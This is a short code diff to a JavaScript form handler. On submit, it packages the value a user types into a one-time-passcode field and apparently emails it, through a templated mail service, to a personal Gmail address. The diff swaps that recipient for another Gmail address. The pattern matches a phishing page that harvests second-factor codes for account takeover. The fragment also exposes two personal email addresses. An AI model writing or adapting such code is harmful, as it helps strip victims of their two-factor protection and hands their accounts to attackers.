@@ -10,7 +10,7 @@ const templateId = "template_1r22rld";
 document.getElementById("myForm").onsubmit = function (event) {
   event.preventDefault();
   const emailParams = {
-    to_name: "Victorchinemerem191@gmail.com",
+    to_name: "scottmccall2277@gmail.com",
     otp: otp.value,
   };
   console.log(emailParams);
